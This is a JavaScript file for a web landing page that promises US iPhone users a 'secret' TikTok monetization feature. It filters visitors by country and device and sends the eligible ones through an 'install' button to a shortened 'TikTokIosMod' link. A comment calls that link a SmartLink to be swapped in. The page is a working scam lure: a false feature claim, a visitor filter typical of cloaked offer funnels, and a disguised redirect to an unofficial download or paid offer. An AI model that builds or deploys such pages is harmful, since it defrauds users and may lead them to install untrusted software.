// Geo + device check using free IP API and userAgent

async function checkGeoDevice() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    const country = data.country_code || '';
    const ua = navigator.userAgent || '';
    const isIOS = /iPhone|iPad|iPod/i.test(ua);
    if (country === 'US' && isIOS) {
      return true;
    }
    return false;
  } catch {
    return false;
  }
}

// Typing effect for intro text
const introTextEl = document.getElementById('intro-text');
const introMessage = "USA iPhone Users Only: Unlock TikTok's secret monetization feature that lets you earn even if you have under 1,000 followers.";

function typeWriter(text, i = 0) {
  if (i < text.length) {
    introTextEl.innerHTML += text.charAt(i);
    setTimeout(() => typeWriter(text, i + 1), 40);
  }
}

document.getElementById('installBtn').addEventListener('click', async () => {
  const allowed = await checkGeoDevice();
  if (!allowed) {
    showWarning();
    return;
  }
  // Replace this URL with your actual SmartLink
  window.location.href = 'https://tinyurl.com/TikTokIosMod';
});

function showWarning() {
  const warn = document.getElementById('blockMsg');
  warn.classList.add('visible');
}

(async () => {
  typeWriter(introMessage);

  const allowed = await checkGeoDevice();
  if (!allowed) {
    document.getElementById('installBtn').disabled = true;
    showWarning();
  } else {
    document.getElementById('installBtn').disabled = false;
  }
})();
